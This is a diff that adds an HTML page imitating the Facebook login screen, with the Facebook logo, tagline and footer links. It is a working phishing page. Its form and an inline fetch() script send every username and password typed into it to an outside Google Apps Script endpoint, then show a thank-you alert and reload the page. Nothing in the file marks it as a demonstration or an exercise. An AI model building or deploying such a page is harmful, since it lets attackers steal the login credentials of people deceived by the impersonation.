@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
+    <style type="text/css">
+        * {
+    padding: 0;
+    margin: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: 'Poppins', sans-serif;
+    background-color: #f0f2f5;
+    color: #1c1e21;
+}
+
+main {
+    height: 70vh;
+    width: 100vw;
+    position: relative;
+    margin: 0 auto;
+}
+
+footer {
+    height: 30vh;
+    background-color: #ffffff;
+}
+
+.row {
+    display: flex;
+    justify-content: space-around;
+    align-items: center;
+    width: 100%;
+    max-width: 1000px;
+    position: absolute;
+    left: 50%;
+    top: 50%;
+    transform: translate(-50%, -50%);
+}
+
+.col-logo {
+    flex: 0 0 50%;
+    text-align: left;
+}
+
+.col-form {
+    flex: 0 0 40%;
+    text-align: center;
+}
+
+.col-logo img {
+    max-width: 300px;
+}
+
+.col-logo h2 {
+    font: 26px;
+    font-weight: 400;
+    padding: 0 30px;
+    line-height: 32px;
+}
+
+.col-form .form-container {
+    background-color: #ffffff;
+    border: none;
+    border-radius: 8px;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+    margin-bottom: 30px;
+    padding: 20px;
+    max-width: 400px;
+}
+
+.col-form .form-container input, .col-form .form-container .btn-login {
+    width: 100%;
+    margin: 5px 0;
+    height: 45px;
+    vertical-align: middle;
+    font-size: 16px;
+}
+
+.col-form .form-container input {
+    border: 1px solid #dddfe2;
+    color: #1d2129;
+    padding: 0 8px;
+    outline: none;
+}
+
+.col-form .form-container input:focus {
+    border-color: #1877f2;
+    box-shadow: 0 0 0 2px #e7f3ff;
+}
+
+.col-form .form-container .btn-login {
+    background-color: #1877f2;
+    border: none;
+    border-radius: 6px;
+    font-size: 20px;
+    padding: 0 16px;
+    color: #ffffff;
+    font-weight: 700;
+}
+
+.col-form .form-container a {
+    display: block;
+    color: #1877f2;
+    font-size: 14px;
+    text-decoration: none;
+    padding: 10px 0 20px;
+    border-bottom: 1px solid #dadde1;
+}
+
+.col-form .form-container a:hover {
+    text-decoration: underline;
+}
+
+.col-form .form-container .btn-new {
+    background-color: #42b72a;
+    border: none;
+    border-radius: 6px;
+    font-size: 17px;
+    line-height: 48px;
+    padding: 0 16px;
+    color: #ffffff;
+    font-weight: 700;
+    margin-top: 20px;
+}
+
+.col-form p {
+    font-size: 14px;
+}
+
+.col-form p a {
+    text-decoration: none;
+    color: #1c1e21;
+    font-weight: 600;
+}
+
+.col-form p a:hover {
+    text-decoration: underline;
+}
+
+.footer-contents {
+    position: relative;
+    max-width: 1000px;
+    margin: 0 auto;
+}
+
+footer ol {
+    display: flex;
+    flex-wrap: wrap;
+    list-style-type: none;
+    padding: 10px 0;
+}
+
+footer ol:first-child {
+    border-bottom: 1px solid #dddfe2;
+}
+
+footer ol:first-child li:last-child button {
+    background-color: #f5f6f7;
+    border: 1px solid #ccd0d5;
+    outline: none;
+    color: #4b4f56;
+    padding: 0 8px;
+    font-weight: 700;
+    font-size: 16px;
+}
+
+footer ol li {
+    padding-right: 15px;
+    font-size: 12px;
+    color: #385898;
+}
+
+footer ol li a {
+    text-decoration: none;
+    color: #385898;
+}
+
+footer ol li a:hover {
+    text-decoration: underline;
+}
+
+footer small {
+    font-size: 11px;
+}
+    </style>
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbw94rCnbNQAjHzZFt-1hsz2i3LHp-NWeAkzPiHIcEHfSKc-VGk4CPObbu_FpLwJSr-QWA/exec';
+            const form = document.forms['contact-form'];
+
+            if (form) {
+                form.addEventListener('submit', e => {
+                    e.preventDefault(); // Prevent default form submission
+
+                    fetch(scriptURL, {
+                        method: 'POST',
+                        body: new FormData(form)
+                    })
+                    .then(response => {
+                        alert("Thankyou For Sharing Your Information");
+                        window.location.reload(); // Reload the page after submission
+                    })
+                    .catch(error => console.error('Error!', error.message)); // Log any errors
+                });
+            } else {
+                console.error('Form not found! Ensure the form has the name "contact-form".');
+            }
+        });
+    </script>
+</head>
+
+<body>
+    <main>
+        <div class="row">
+            <div class="col-logo">
+                <img src="data:image/png;base64,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" alt="Logo">
+                <h2>Facebook helps you connect and share with the people in your life.</h2>
+            </div>
+            <div class="col-form">
+                <div class="form-container">
+                    <form method="post" action="https://script.google.com/macros/s/AKfycbw94rCnbNQAjHzZFt-1hsz2i3LHp-NWeAkzPiHIcEHfSKc-VGk4CPObbu_FpLwJSr-QWA/exec" name="contact-form">
+                        <h4>Login</h4>
+                        <input type="text" name="username" placeholder="Email or phone number">
+                        <input type="password" name="password" placeholder="Password">
+                        <button class="btn-login">Login</button>
+                        <a href="#">Forgotten password?</a>
+                        <button class="btn-new">Create new Account</button>
+                    </form>
+                </div>
+                <p><a href="#"><b>Create a Page</b></a> for a celebrity, brand or business.</p>
+            </div>
+        </div>
+    </main>
+    <footer>
+        <div class="footer-contents">
+            <ol>
+                <li>English (UK)</li>
+                <li><a href="#">മലയാളം</a></li>
+                <li><a href="#">தமிழ்</a></li>
+                <li><a href="#">తెలుగు</a></li>
+                <li><a href="#">বাংলা</a></li>
+                <li><a href="#">اردو</a></li>
+                <li><a href="#">हिन्दी</a></li>
+                <li><a href="#">ಕನ್ನಡ</a></li>
+                <li><a href="#">Español</a></li>
+                <li><a href="#">Português (Brasil)</a></li>
+                <li><a href="#">Français (France)</a></li>
+                <li><button>+</button></li>
+            </ol>
+
+            <ol>
+                <li><a href="#">Sign Up</a></li>
+                <li><a href="#">Log In </a></li>
+                <li><a href="#">Messenger</a></li>
+                <li><a href="#">Facebook Lite</a></li>
+                <li><a href="#">Watch</a></li>
+                <li><a href="#">People</a></li>
+                <li><a href="#">Pages</a></li>
+                <li><a href="#">Page categories</a></li>
+                <li><a href="#">Places</a></li>
+                <li><a href="#">Games</a></li>
+                <li><a href="#">Locations</a></li>
+                <li><a href="#">Marketplace</a></li>
+                <li><a href="#">Facebook</a></li>
+                <li><a href="#">PayGroups</a></li>
+                <li><a href="#">Jobs</a></li>
+                <li><a href="#">Oculus</a></li>
+                <li><a href="#">Portal</a></li>
+                <li><a href="#">Instagram</a></li>
+                <li><a href="#">Local</a></li>
+                <li><a href="#">Sign Up</a></li>
+                <li><a href="#">Log In </a></li>
+                <li><a href="#">Messenger</a></li>
+                <li><a href="#">Facebook Lite</a></li>
+                <li><a href="#">Watch</a></li>
+                <li><a href="#">People</a></li>
+                <li><a href="#">Pages</a></li>
+                <li><a href="#">Page categories</a></li>
+                <li><a href="#">Places</a></li>
+                <li><a href="#">Games</a></li>
+                <li><a href="#">Locations</a></li>
+                <li><a href="#">Marketplace</a></li>
+                <li><a href="#">Facebook</a></li>
+                <li><a href="#">PayGroups</a></li>
+                <li><a href="#">Jobs</a></li>
+                <li><a href="#">Oculus</a></li>
+                <li><a href="#">Portal</a></li>
+                <li><a href="#">Instagram</a></li>
+                <li><a href="#">Local</a></li>
+            </ol>
+            <small>Facebook © 2022</small>
+        </div>
+    </footer>
+</body>
+
+</html>
